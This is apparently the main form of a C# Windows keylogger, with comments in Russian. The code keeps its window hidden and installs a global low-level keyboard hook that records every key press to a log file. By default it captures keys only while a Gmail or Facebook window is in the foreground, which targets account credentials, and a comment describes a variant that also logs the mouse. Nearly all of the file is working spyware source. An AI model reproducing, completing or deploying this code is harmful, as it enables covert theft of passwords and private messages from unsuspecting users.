using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace sys5_KeyLogger
{
	public partial class Form1 : Form
	{
		MyKeyLogger myKeyLogger;
		static WindowTitleChecker wtc;
		public Form1()
		{
			StringMusic.Proceed();

			InitializeComponent();

			notifyIcon1.DoubleClick += NotifyIcon1_DoubleClick;

			// срабатывание логера только в окнах с определенными заголовками
			wtc = new WindowTitleChecker(new string[] { "Gmail", "Facebook — " }); // закомментить для хука всех окон

			// 2 варианта кейлоггера, 1 закомментировать
			SetHook(); // hook версия
			// myKeyLogger = new MyKeyLogger(wtc); // другая версия, с логированием мыши

			if (myKeyLogger != null)
				myKeyLogger.Start();
		}

		protected override void SetVisibleCore(bool value)
		{
			value = false;
			if (!this.IsHandleCreated) CreateHandle();
			
			base.SetVisibleCore(value);
		}

		private void NotifyIcon1_DoubleClick(object sender, EventArgs e)
		{
			Application.Exit();
		}

		private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

		// подключение библиотек
		// установка хука
		[DllImport("user32.dll")]
		static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callBack, IntPtr hinstance, uint threadId);

		//функция для снятия пользовательского хука
		[DllImport("user32.dll")]
		static extern bool UnhookWindowsHookEx(IntPtr hinstance);
		//передача сообщения для цепочки 
		[DllImport("user32.dll")]
		static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);
		//Функция для загрузки библиотек
		[DllImport("kernel32.dll")]
		static extern IntPtr LoadLibrary(string lpFileName);
		//Номер глобального LowLewel-хука на клавиатуру
		const int WH_KEYBOARD_LL = 13;
		//Сообщение нажатия на клавишу
		const int WM_KEYDOWN = 0x100;
		//Создаем callback делегат
		private LowLevelKeyboardProc _proc = hookProc;
		//Создаем hook и пресваеваем ему значение 0
		private static IntPtr hhook = IntPtr.Zero;
		private static IntPtr hookProc(int nCode, IntPtr wParam, IntPtr lParam)
		{
			//обработка нажатия 
			if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
			{
				if (wtc == null || ( wtc != null && wtc.Check() ))
				{
					int vkCode = Marshal.ReadInt32(lParam);

					KeysConverter keysConverter = new KeysConverter();
					Log.ToFile(keysConverter.ConvertToString(vkCode) + " ");

				}
				return (IntPtr)0;
			}
			else
			{
				return CallNextHookEx(hhook, nCode, (int)wParam, lParam);
			}
		}
		public void SetHook()
		{
			IntPtr hinstance = LoadLibrary("User32");
			hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hinstance, 0);
		}
		protected override void OnClosing(CancelEventArgs e)
		{
			UnhookWindowsHookEx(hhook);
			base.OnClosing(e);
		}
	}
}
